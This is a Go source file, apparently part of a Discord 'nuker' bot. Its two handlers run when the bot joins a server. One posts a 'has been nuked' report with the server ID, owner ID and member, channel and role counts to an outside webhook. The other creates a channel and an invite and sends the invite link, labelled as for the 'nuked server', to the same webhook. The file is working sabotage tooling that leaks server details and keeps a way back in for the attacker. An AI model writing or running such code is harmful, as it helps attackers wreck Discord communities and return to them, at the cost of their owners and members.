package cogs

import (
	"encoding/json"
	"fmt"
	"os"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func Logs(s *discordgo.Session, event *discordgo.GuildCreate) {

	godotenv.Load()
	AVATAR_URL := os.Getenv("AVATAR_URL")
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	channels, _ := s.GuildChannels(event.ID)
	textChannels := len(channels)

	roles, _ := s.GuildRoles(event.ID)
	rolesInt := len(roles)

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:     "Server " + fmt.Sprint(event.Name) + " has been nuked.",
		Thumbnail: &thumbnail,
		Color:     00255,
		Description: "> **Server ID:** " + "`" + fmt.Sprint(event.ID) + "`\n" +
			"> **Owner ID:** " + "`" + fmt.Sprint(event.OwnerID) + "`\n" +
			"> **Region:** " + "`" + fmt.Sprint(event.Region) + "`\n" +
			"> **Nuker:** " + "`" + fmt.Sprint("...") + "`\n" +
			"\n" +
			"> **All Members:** " + "`" + fmt.Sprint(event.MemberCount) + "`\n" +
			"> **All Channels:** " + "`" + fmt.Sprint(textChannels) + "`\n" +
			"> **All Roles:** " + "`" + fmt.Sprint(rolesInt) + "`\n" +
			"\n" +
			"> **Joined At:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}

	jsonData, _ := json.Marshal(data)

	Sendhttp(string(WEBHOOK_URL), "POST", jsonData)

}

func InviteCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()
	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")

	channel, _ := s.GuildChannelCreate(event.ID, CHANNEL_NAME, discordgo.ChannelTypeGuildText)

	godotenv.Load()
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	invite, _ := s.ChannelInviteCreate(channel.ID, discordgo.Invite{})

	embed := discordgo.MessageEmbed{
		Title:       "Invite to nuked server",
		Color:       00255,
		Description: "> **" + "https://discord.gg/" + fmt.Sprint(invite.Code) + "**\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}
	jsonData, _ := json.Marshal(data)

	Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
}